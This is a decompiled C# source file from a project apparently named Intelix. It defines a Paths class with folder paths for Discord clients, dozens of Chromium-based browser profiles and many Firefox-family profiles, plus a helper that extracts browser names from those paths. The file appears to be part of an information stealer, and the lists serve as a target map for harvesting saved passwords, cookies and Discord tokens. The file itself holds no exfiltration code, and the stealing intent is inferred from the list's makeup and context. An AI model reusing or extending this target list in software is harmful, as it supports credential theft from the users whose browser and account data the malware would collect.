using System;
using System.IO;

namespace Intelix.Helper.Data
{
	// Token: 0x0200007F RID: 127
	public static class Paths
	{
		// Token: 0x06000200 RID: 512 RVA: 0x0001969C File Offset: 0x0001789C
		public static string GetBrowserName(string path)
		{
			string[] array = path.Split(new char[]
			{
				Path.DirectorySeparatorChar
			});
			bool flag = path.Contains("Opera");
			string result;
			if (flag)
			{
				result = array[6].Replace(" Stable", "");
			}
			else
			{
				result = array[5];
			}
			return result;
		}

		// Token: 0x04000079 RID: 121
		public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x0400007A RID: 122
		public static string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x0400007B RID: 123
		public static string[] Discord = new string[]
		{
			Paths.appdata + "\\discord",
			Paths.appdata + "\\discordcanary",
			Paths.appdata + "\\Lightcord",
			Paths.appdata + "\\discordptb"
		};

		// Token: 0x0400007C RID: 124
		public static string[] Chromium = new string[]
		{
			Paths.appdata + "\\Lulumi-browser",
			Paths.appdata + "\\kingpinbrowser",
			Paths.appdata + "\\Falkon\\Profiles",
			Paths.appdata + "\\Hola\\chromium_profile",
			Paths.appdata + "\\Opera Software\\Opera Stable",
			Paths.appdata + "\\Opera Software\\Opera GX Stable",
			Paths.localappdata + "\\Battle.net",
			Paths.localappdata + "\\GhostBrowser",
			Paths.localappdata + "\\ColibriBrowser",
			Paths.localappdata + "\\Min\\User Data",
			Paths.localappdata + "\\Coowon\\Coowon",
			Paths.localappdata + "\\Uran\\User Data",
			Paths.localappdata + "\\Kinza\\User Data",
			Paths.localappdata + "\\Blisk\\User Data",
			Paths.localappdata + "\\Xvast\\User Data",
			Paths.localappdata + "\\Torch\\User Data",
			Paths.localappdata + "\\CryptoTab Browser",
			Paths.localappdata + "\\Comodo\\User Data",
			Paths.localappdata + "\\Kometa\\User Data",
			Paths.localappdata + "\\liebao\\User Data",
			Paths.localappdata + "\\Chedot\\User Data",
			Paths.localappdata + "\\K-Melon\\User Data",
			Paths.localappdata + "\\Orbitum\\User Data",
			Paths.localappdata + "\\Vivaldi\\User Data",
			Paths.localappdata + "\\Slimjet\\User Data",
			Paths.localappdata + "\\Iridium\\User Data",
			Paths.localappdata + "\\Maxthon\\User Data",
			Paths.localappdata + "\\Maxthon3\\User Data",
			Paths.localappdata + "\\Nichrome\\User Data",
			Paths.localappdata + "\\Chromodo\\User Data",
			Paths.localappdata + "\\QIP Surf\\User Data",
			Paths.localappdata + "\\Chromium\\User Data",
			Paths.localappdata + "\\BitTorrent\\Maelstrom",
			Paths.localappdata + "\\Globus VPN\\User Data",
			Paths.localappdata + "\\CentBrowser\\User Data",
			Paths.localappdata + "\\Amigo\\User\\User Data",
			Paths.localappdata + "\\MapleStudio\\ChromePlus",
			Paths.localappdata + "\\7Star\\7Star\\User Data",
			Paths.localappdata + "\\Mail.Ru\\Atom\\User Data",
			Paths.localappdata + "\\Comodo\\Dragon\\User Data",
			Paths.localappdata + "\\UCBrowser\\User Data_i18n",
			Paths.localappdata + "\\Google\\Chrome\\User Data",
			Paths.localappdata + "\\Coowon\\Coowon\\User Data",
			Paths.localappdata + "\\CocCoc\\Browser\\User Data",
			Paths.localappdata + "\\AOL\\AOL Shield\\User Data",
			Paths.localappdata + "\\Microsoft\\Edge\\User Data",
			Paths.localappdata + "\\uCozMedia\\Uran\\User Data",
			Paths.localappdata + "\\Element Browser\\User Data",
			Paths.localappdata + "\\Sputnik\\Sputnik\\User Data",
			Paths.localappdata + "\\Elements Browser\\User Data",
			Paths.localappdata + "\\CCleaner Browser\\User Data",
			Paths.localappdata + "\\360Chrome\\Chrome\\User Data",
			Paths.localappdata + "\\Tencent\\QQBrowser\\User Data",
			Paths.localappdata + "\\Naver\\Naver Whale\\User Data",
			Paths.localappdata + "\\Baidu\\BaiduBrowser\\User Data",
			Paths.localappdata + "\\360Browser\\Browser\\User Data",
			Paths.localappdata + "\\Google(x86)\\Chrome\\User Data",
			Paths.localappdata + "\\Epic Privacy Browser\\User Data",
			Paths.localappdata + "\\CatalinaGroup\\Citrio\\User Data",
			Paths.localappdata + "\\Yandex\\YandexBrowser\\User Data",
			Paths.localappdata + "\\MapleStudio\\ChromePlus\\User Data",
			Paths.localappdata + "\\AVAST Software\\Browser\\User Data",
			Paths.localappdata + "\\BraveSoftware\\Brave-Browser\\User Data",
			Paths.localappdata + "\\NVIDIA Corporation\\NVIDIA GeForce Experience",
			Paths.localappdata + "\\BraveSoftware\\Brave-Browser-Nightly\\User Data",
			Paths.localappdata + "\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer"
		};

		// Token: 0x0400007D RID: 125
		public static string[] Gecko = new string[]
		{
			Paths.appdata + "\\Mozilla\\Firefox\\Profiles",
			Paths.appdata + "\\Waterfox\\Profiles",
			Paths.appdata + "\\K-Meleon\\Profiles",
			Paths.appdata + "\\Thunderbird\\Profiles",
			Paths.appdata + "\\Comodo\\IceDragon\\Profiles",
			Paths.appdata + "\\8pecxstudios\\Cyberfox\\Profiles",
			Paths.appdata + "\\NETGATE Technologies\\BlackHaw\\Profiles",
			Paths.appdata + "\\Moonchild Productions\\Pale Moon\\Profiles",
			Paths.appdata + "\\Ghostery Browser\\Profiles",
			Paths.appdata + "\\Undetectable\\Profiles",
			Paths.appdata + "\\Sielo\\profiles",
			Paths.appdata + "\\Waterfox\\Profiles",
			Paths.appdata + "\\conkeror.mozdev.org\\conkeror\\Profiles",
			Paths.appdata + "\\Netscape\\Navigator\\Profiles",
			Paths.appdata + "\\Mozilla\\SeaMonkey\\Profiles",
			Paths.appdata + "\\FlashPeak\\SlimBrowser\\Profiles",
			Paths.appdata + "\\Avant Profiles",
			Paths.appdata + "\\Flock\\Profiles"
		};
	}
}
